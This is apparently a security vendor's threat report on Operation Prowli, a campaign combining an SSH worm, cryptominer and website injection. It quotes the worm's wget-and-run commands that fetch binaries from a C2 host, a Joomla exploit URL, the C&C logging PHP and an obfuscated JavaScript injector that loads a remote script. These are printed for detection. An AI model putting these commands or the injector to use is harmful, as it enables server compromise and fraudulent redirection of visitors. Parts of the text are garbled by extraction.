This campaign, dubbed\n\n**Operation Prowli, spreads malware and malicious code to servers and websites and has compromised more**\n\nthan 40,000 machines in multiple areas of the world. Prowli uses various attack techniques including exploits,\n\npassword brute-forcing and weak configurations.\n\nThis multi-purpose operation targets a variety of platforms – CMS servers hosting popular websites, backup\n\nservers running HP Data Protector, DSL modems and IoT devices. Victim machines are monetised using a variety\n\nof methods relying on internet trends such as digital currencies and traffic redirection Traffic monetisation\n\n\n-----\n\np, y g g\n\nthe traffic monetizer to the scam operator. In this report, we focus on the attackers’ techniques, methodologies,\n\ninfrastructure and goals. We will dive into the technical details and the way the money flows. A list of indicators\n\nof compromise (IOCs) related to the operation is provided at the end of the post.\n\n## Discovering the r2r2 worm\n\nOn the 4th of April, the GuardiCore Global Sensor Network (GGSN) reported a group of SSH attacks\n\ncommunicating with a C&C server. The attacks all behaved in the same fashion, communicating with the same\n\nC&C server to download a number of attack tools named r2r2 along with a cryptocurrency miner.\n\n_Some of the attackers’ steps as recorded by GGSN_\n\n\n-----\n\nknown datasets such as VirusTotal\n\nThe attackers used binaries with the same domain name hardcoded in the code and each of the binaries was\n\ndesigned to attack different services and CPU architectures\n\nOver a period of 3 weeks, we captured dozens of such attacks per day coming from over 180 IPs from a variety of\n\ncountries and organizations. These attacks led us to investigate the attackers’ infrastructure and discover a wide\n\nranging operation attacking multiple services.\n\n## Scope\n\nWe found that the attackers store a large collection of victim machines with IPs and domains that expose\n\ndifferent services to the Internet. These services are all either vulnerable to remote pre-authentication attacks\n\nor allow the attackers to bruteforce their way inside. The list of targeted services includes Drupal CMS websites,\n\nWordPress sites, DSL modems, servers with an open SSH port, vulnerable IoT devices, servers exposing HP Data\n\nProtector software and more.\n\n\n-----\n\n_Most of the victims ran with weak SSH credentials_\n\nThe attackers behind Operation Prowli assaulted organizations of all types and sizes which is in line with\n\n[previous attacks we investigated.](https://www.guardicore.com/2017/05/the-bondnet-army/)\n\n\n-----\n\n_p_\n\nOperation Prowli has compromised a wide range of services, without targeting a specific sector.\n\n_Victims by Industry_\n\n\n-----\n\nespionage. We currently understand two key flows of revenue in this operation.\n\nThe first source of revenue comes from cryptocurrency mining. Typically, cryptocurrency mining is considered a\n\nresource-heavy operation that involves a large upfront investment followed by ongoing traffic and energy costs.\n\nThe attackers behind Prowli incur no expenses when they use r2r2 to take over computers owned by others and\n\nuse mining pools to launder their gains. Cryptocurrency is a common payload of modern worms, and in this case\n\n\n-----\n\nwebsite operators such as the Prowli attackers and redirect it to domains on demand. Website operators\n\nearn money per traffic sent through roi777. The destination domains frequently host different scams, such as\n\nfake services, malicious browser extensions and more.\n\n_An example of a fake website visitors are redirected to_\n\nThis is a dirty business and typically, all three sides, buyers and sellers of traffic and the middlemen, engaging in\n\nillicit activity. In our case, Prowli sells traffic by redirecting visitors from compromised legitimate websites to\nd i h ti t h t f k b t i d t d Th t ffi ti\n\n\n-----\n\nthe “legitimate” part of the website, listing users, bitcoin wallet addresses, telegram IDs etc, providing a dataset\n\nof who is using the traffic redirection service.\n\n## What’s Under Attack?\n\nOperation Prowli operators maintain a toolbox with a variety of attack methods to fit their needs. We’ve seen\n\ndifferent types of attacks, each based on a different service. Some attacks are based on worms that randomly\nattack IPs in the internet, while others targeting CMS servers use a master list of targets.\n\nA partial list of the attack vectors we’ve seen include:\n\nMachines running SSH are hacked by a self propagating worm spread by brute force credential guessing, the\n\nvictims download and run a cryptocurrency miner.\n\n[Joomla! Servers running the K2 extension are attacked with file download vulnerability, using a URL such as](https://extensions.joomla.org/extension/k2/)\n\n_http://.com/index.php?option=com_k2&view=media&task=connector&cmd=file&target=[base64 of file_\n\n_path]&download=1_\n\nThis provides the attackers sensitive server configuration data such as passwords and API keys.\n\n\n-----\n\n_Joomla! Configuration details_\n\nA variety of DSL modems are hacked by accessing their internet facing configuration panel using a URL such\n[as http://:7547/UD/act?1 and passing in parameters exploiting a known vulnerability. The vulnerability](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)\n\nresides in the processing of SOAP data and allows remote code execution. This vulnerability was previously\n[used by the Mirai worm.](https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759)\n\nWordPress servers are hacked by a variety of infectors – some attempt to brute force login into the WP\nadministrative panel, others exploit old vulnerabilities in WordPress installations. A third type of attacks\n\nsearches for servers with configuration problems, such as exposing FTP credentials when accessing\nhttp://.com/wp-config.php~.\n\nServers running HP Data Protector exposed to the internet (over port 5555) are exploited using a 4 year old\n[vulnerability – CVE-2014-2623 used to execute commands with system privileges.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2623)\n\nThe attackers also target systems with Drupal, PhpMyAdmin installations, NFS boxes and servers with exposed\n\nSMB ports open to brute force credential guessing.\n\nAn additional type of victims are compromised servers which host a well known open source webshell named\n[“WSO Web Shell”.](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/)\n\n\n-----\n\n_Complete control of infected machines_\n\nThese php-based shells provide access and remote code execution on different compromised machines,\nfrequently running vulnerable versions of WordPress.\n\n\n-----\n\n_Easy for the attacker to use the machines for further attacks_\n\nWe believe that these webshells are used by the attackers as pivot points. They provide a reliable platform to\n\nrun scanning and attack scripts.\n\n## Bruteforce for the win\n\nLet’s take a closer look at the brute force SSH attack that tipped us off to this operation. The binary named r2r2\n[is written in Golang. A quick look showed that r2r2 randomly generates IP address blocks and iteratively tries to](https://golang.org/)\n\nbrute force SSH logins with a user/password dictionary.\n\nOnce it breaks in, it runs a series of commands on the victim. These commands run wget to download files from a\n\nhard coded server:\n\nMultiple copies of the worm for different CPU architectures\n\nA cryptocurrency miner and configuration file\n\n\n-----\n\n_The worm runs commands on remote victims and then reports credentials to a C2 server_\n\n\n-----\n\ncd /tmp;wget O r2r2 h[]://wp.startreceive.tk/tdest/z/r2r2;chmod 777\n\nr2r2;./r2r2 > /dev/null 2>&1 &\n\ncd /tmp;wget -O r2r2-a h[]://wp.startreceive.tk/test/z/r2r2-a;chmod\n\n777 r2r2-a;./r2r2-a > /dev/null 2>&1 &\n\ncd /tmp;wget -O r2r2-m h[]://wp.startreceive.tk/test/z/r2r2-m;chmod\n\n777 r2r2-m;./r2r2-m > /dev/null 2>&1\n\ncd /tmp;wget -O xm111 h[]://wp.startreceive.tk/test/z/xm111;chmod 777\n\nxm111;wget -O config.json\n\nh[]://wp.startreceive.tk/test/z/config.json;chmod 777\n\nconfig.json;./xm111 > /dev/null 2>&1\n\n\nThe different versions of the r2r2 binary, r2r2, r2r2-a and r2r2-m are the same binary compiled for different\nplatforms, x86, ARM and MIPS respectively.\n\n\n### \n\n\n-----\n\n_From the binary we also extracted strings helping us name the attackers_\n\nAfter breaking into the server, the credentials used to login to the victim are transmitted over plaintext HTTP to\n\nwp.startreceive[.]tk/test/p.php and logged in the attackers server. Some versions of the worm send more details\nabout the victims such as CPU, kernel dist version, etc.\n\n## Joomla!.tk C&C\n\nThe attackers’ attack tools report to a C&C server running under the domain name wp.startreceive[.]tk. This\n\n[Joomla! server is a compromised server, which the attackers reuse to track their malware, collect information](https://www.joomla.org/)\n\nfrom the ever growing victims list and also serve different payloads to compromised machines.\n\nThe C&C logic is implemented by a group of PHP files who receive data on victims from the relevant infectors\n\nand store the details. The victims are catalogued by exploitation method with all the details needed to allow the\n\nattackers to access them again at any given time.\n\nif ( isset ($_GET[‘p’ ])) {\n\n$myfile = file_put_contents( ‘ip2_log.txt’, $ip. “||” .$_GET[ ‘p’\n\n].PHP_EOL, FILE_APPEND | LOCK_EX);\n\n}\n\nelseif ( isset ($_GET[‘p1’])){\n\n\n-----\n\n}\n\nelse {\n\nif ( isset ($_GET[ ‘p2’ ])){\n\n$myfile = file_put_contents( ‘ip4_log.txt’, $ip. “||” .$_GET[ ‘p2’\n\n].PHP_EOL, FILE_APPEND | LOCK_EX);\n\n}\n\n}\n\nif ( isset ($_GET[ ‘t1’ ])) {\n\n$myfile = file_put_contents( ‘mhcl_log.txt’, $ip.PHP_EOL,\n\nFILE_APPEND | LOCK_EX);\n\n}\n\nif ( isset ($_GET[ ‘t2’ ])) {\n\n$myfile = file_put_contents( ‘dru_log.txt’, $_GET[ ‘t2’ ].PHP_EOL,\n\nFILE_APPEND | LOCK_EX);\n\n}\n\n_A snippet from the attackers C&C code_\n\nFor every targeted service, victim data is stored in a log file with all the data the attacker needs to regain access\nto the machine. For example:\n\nWordPress administration panel – Login credentials\n\n\n-----\n\nWordPress weak configuration – URL exposing FTP credentials\n\n[DSL modems – URL exposing vulnerable configuration panels](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)\n\n[Webshell – A URL hosting “WSO Web Shell” and credentials](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/)\n\n_A snippet from a log file detailing accessible WordPress MySQL databases_\n\n## Show me the payload\n\nThe attackers behind Operation Prowli use different payloads for each of their targets. The SSH brute force\n\nattack provides the attackers with complete control of the system and are used to mine cryptocurrency, while\nbreached websites are used to run different Web frauds. Other victims are picked by the attackers to execute\n\nmore attacks, similar to how the server behind wp.startreceive[.]tk was used as a C&C server.\n\nA significant part of this operation infects websites that run vulnerable CMS software. In some cases, the\npayload is a PHP file that infects the website and injects code into different PHP pages and JavaScript files.\n\n\n-----\n\n_Part of a PHP file executed on a vulnerable server_\n\nThe PHP injector function php_in checks whether the targeted PHP file outputs HTML and if it does, injects a\n\nsnippet of JavaScript code into the generated page. This snippet starts a process that ends with innocent\n\nwebsite visitors redirected to a malicious website.\n\n\n-----\n\n_The Prowli attackers intermediate between infected websites and roi777_\n\n\n-----\n\nprovided URL. We believe that the send.php page belongs to roi777 and is being used by Prowli as the\nintegration point between roi777’s infrastructure and “website operators”. To make sure roi777 doesn’t track\n\nthe list of websites controlled by Prowli operators, the Prowli code injector script uses a redirect website\n\n(stats.startreceive[.]tk) on which the send.php page is hosted rather than injecting the code into infected\n\nwebsites.\n\n_Before and after the redirector script is deobfuscated_\n\nThe send.php page retrieves the target domain name to which the victim is later redirected to from roi777[.]com.\n\n\n-----\n\n_An example of a tech support scam visitors are redirected to_\n\nTo sum it up, Prowli takes over legitimate websites and turns them, without their knowing, into redirectors of\ntraffic towards malicious websites, some of which are simple scams, others reference tech support scams.\n\n## Detection & Prevention\n\nThe attacks are based on a mix of known vulnerabilities and credential guessing. This means prevention should\n\n\n-----\n\ny\n\nFor CMS software, if routine patching or external hosting is not a solution, assume at some point it will be\n[hacked and follow strict hardening guides. The major CMS vendors WordPress and Drupal provide hardening](https://codex.wordpress.org/Hardening_WordPress)\n\nguides. For example, a locked down WordPress installation would have prevented attackers from modifying files\n\n[with their injected code. For general purpose PHP websites, OWASP provides a hardened PHP configuration.](https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet)\n\nSegmentation is a good practice and since you can’t always prevent the breach, you should segment and monitor\n[your network to minimise harm and avoid infamous breaches such as the fish tank breach. Routinely review who](https://thehackernews.com/2018/04/iot-hacking-thermometer.html)\n\nand what can access the servers. Keep this list to a minimum and pay special attention to IoT devices whose\n\ncredentials cannot be changed. Monitoring connections would easily show compromised devices\n\ncommunicating with cryptocurrency mining pools.\n\n##### R2R2 infected machines\n\nIf you have an infected machine with r2r2, stopping the worm & miner processes (r2r2 and xm11) and deleting\nthe files will suffice to clean up the attack. Don’t forget to change passwords after the cleanup. You can detect\n\nthese machines by looking for high CPU usage or an abnormal amount of outgoing SSH connections to unknown\n\nIPs.\n\n##### Detect visitors of Prowli infected websites\n\nDiscovering if any of the computers in your network has visited an infected website can be done by examining\n\nnetwork traffic and searching for traffic to wp.startreceive[.]tk and stats.startreceive[.]tk. Machines that tried to\nresolve one of these domains, have previously visited an infected website. We advise you to make sure users\n\nhave not installed any malicious software or were exploited by common browser vulnerabilities. Also, it might be\n\nworth to search for domains ending in .tk. While there are legitimate web sites under that gTLD, according to this\n\n[research, phishing domains are incredibly common under this register.](http://docs.apwg.org/reports/APWG_Global_Phishing_Report_2015-2016.pdf)\n\n\n-----\n\neval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61, 32, 100, 111,\n\n99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108,\n\n101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41,\n\n59, 32, 122, 46, 116, 121, 112, 101, 32, 61, 32, 34, 116, 101, 120,\n\n116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 34, 59, 32,\n\n122, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58,\n\n47, 47, 115, 116, 97, 116, 115, 46, 115, 116, 97, 114, 116, 114, 101,\n\n99, 101, 105, 118, 101, 46, 116, 107, 47, 115, 99, 114, 105, 112, 116,\n\n46, 106, 115, 63, 100, 114, 61, 49, 34, 59, 32, 100, 111, 99, 117,\n\n109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110,\n\n100, 67, 104, 105, 108, 100, 40, 122, 41, 59));\n\n\nPHP files:\n\n\n<script language=javascript>eval(String.fromCharCode(118, 97, 114, 32,\n\n122, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114,\n\n101 97 116 101 69 108 101 109 101 110 116 40 34 115 99\n\n\n-----\n\n105, 112, 116, 34, 59, 32, 122, 46, 115, 114, 99, 32, 61, 32, 34, 104,\n\n116, 116, 112, 115, 58, 47, 47, 115, 116, 97, 116, 115, 46, 115, 116,\n\n97, 114, 116, 114, 101, 99, 101, 105, 118, 101, 46, 116, 107, 47, 115,\n\n99, 114, 105, 112, 116, 46, 106, 115, 63, 100, 114, 61, 49, 34, 59,\n\n32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46,\n\n97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41,\n\n59));</script>\n\n\nIf you find these snippets or similar pieces of code, you should assume the website is compromised and start\n\nfrom a clean slate.\n\n## Conclusion\n\nGuardiCore Labs investigation revealed how the Prowli attackers have monetized their malicious activity using\n\ncryptocurrency mining and traffic hijacking. They breached unsecured machines to get Monero using a fully\n\nautomated worm, and infected compromised websites to redirect their visitors to malicious domains. We also\ntied this operation to the roi777 traffic “monetization” organisation that has been active for quite some time.\n\nProwli has compromised tens of thousands of machines by exploiting unsecured websites and servers. Simple\n\nbut efficient attacks can get you very far in today’s internet and it’s not just unsecured IoT devices; Large parts of\nthe internet consist of unmaintained systems, unpatched and left with default credentials are targeted.\n\nWhile cryptocurrency mining and traffic manipulation are the main uses of the compromised machines we’ve\n\nseen, the attackers keep all their options open.
